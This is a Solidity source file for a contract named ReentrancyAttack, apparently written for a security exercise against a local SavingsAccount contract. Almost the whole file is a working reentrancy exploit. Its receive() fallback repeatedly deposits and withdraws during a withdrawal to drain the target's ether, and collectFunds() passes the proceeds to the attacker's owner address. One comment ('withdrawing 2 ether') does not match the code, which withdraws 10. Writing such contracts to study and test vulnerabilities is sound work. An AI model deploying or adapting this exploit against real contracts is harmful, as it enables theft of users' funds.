// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/SavingsAccount.sol";

contract ReentrancyAttack {
    SavingsAccount public savingsAccount;
    address public owner;

    constructor(SavingsAccount _savingsAccount) {
        savingsAccount = _savingsAccount;
        owner = msg.sender;
    }

    receive() external payable {
        uint256 balance = savingsAccount.balances(address(this));
        uint256 savingsBalance = address(savingsAccount).balance;

        if (balance > 1) {
            if (savingsBalance > 0) {
                savingsAccount.deposit{value: 10 ether}();
                uint256 withdrawAmount = balance > 15 ether ? 15 ether : balance;
                savingsAccount.withdraw(withdrawAmount);
            }
        }
    }

    function attack() external payable {
        require(msg.value >= 100 ether, "Not enough Ether sent for attack");
        
        // Deposit just enough to be eligible for the bonus
        savingsAccount.deposit{value: 100 ether}();

        // Start the attack by withdrawing 2 ether
        savingsAccount.withdraw(10 ether);
    }

    function collectFunds() external {
        require(msg.sender == owner, "Only owner can collect funds");
        payable(owner).transfer(address(this).balance);
    }
}
